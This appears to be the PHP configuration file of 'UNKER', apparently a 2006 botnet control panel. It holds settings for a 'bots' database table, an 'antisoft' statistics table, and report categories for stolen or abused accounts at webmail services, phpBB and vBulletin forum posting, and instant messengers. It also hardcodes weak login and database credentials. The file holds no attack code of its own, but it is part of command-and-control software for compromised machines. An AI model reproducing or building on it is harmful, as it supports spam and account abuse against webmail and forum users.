<?php

$UNKER_VERSION ='1.4.4-1b';
$UNKER_RELEASE_DATE ='14.05.2006';

//User
$user = 'root';
$pass = '123';



//Main Database connection----------------------------------------
$BOT_DBHOST='localhost';
$BOT_DBLOGIN='derot';
$BOT_DBPASS='AAiqi125';

//Main Database option
$BOT_DBNAME='derot';
$BOT_DBTBL='bots';
$BOT_CRYPT_PARAM='0';





//Server address
$S_ADDR = 'http://'.@$_SERVER['SERVER_NAME'];

//Enter on page----------------------------------------
$login_index='index.php';

//Img way;----------------------------------------
$img_way='img/';

//Login Type
$Login_type="2";


//Statistic----------------------------------------
$MATCH=10;
$MATCH_COUNTRIES=20;
$SOFT_TBL = 'antisoft_glob';



//Default land for Global-soft statistic, where soft statistics is show.
$STAT_DEF_LAND_SS = 'COUNTRIES';





////////////////////////////////////////UNKER-BASED properties (don`t need to change)


// Raport parameter for Web mail service. Format name=>desc.
$R_WEB_MAIL = array(
'bmyahoo'=>'mail.yahoo.com',
'bmmsn'=>'hotmail.msn.com',
'bmmcom'=>'mail.com',
'bmlycos'=>'lycos.com',
'bmcare2'=>'care2.com',
'bmmailru'=>'Mail.ru',  
'bmrambler'=>'rambler.ru',
'bmearthlink'=>'earthlink.net',
'bmaol'=>'webmail.aol.com',
'bmgmail'=>'mail.google.com/mail/',
'bmcomcast'=>'comcast.net'
);

// Raport parameter for Web Forus service. Format name=>desc.
$R_WEB_FORUM = array(
'fobbrpl'=>'phpbb reply',
'fobbnew'=>'phpbb new topic',
'fovbrpl'=>'VBuletin reply',
'fovbnew'=>'VBuletin new topic');



// Raport parameter for IM and Misc. Format key=>name.
$R_MISC = array(
'i'=>'icq',
's'=>'mail',
'y'=>'yahoo',
'g'=>'google',
'a'=>'aim',
'sbt'=>'sbots'
);





//TIME OPERATIONS
$tm = array(
"lday"=>date('d',time()),
"ltme"=>date('H:i:s',time()),
"lhour"=>date('H',time()),
"lmonth"=>date('m',time()),
"lyear"=>date('y',time()),
"lrep"=>date('d',time()).'/'.date('m',time()).'/'.date('y',time()),
"lrep_prev_day"=>(date('d',time())-1).'/'.date('m',time()).'/'.date('y',time())
);

?>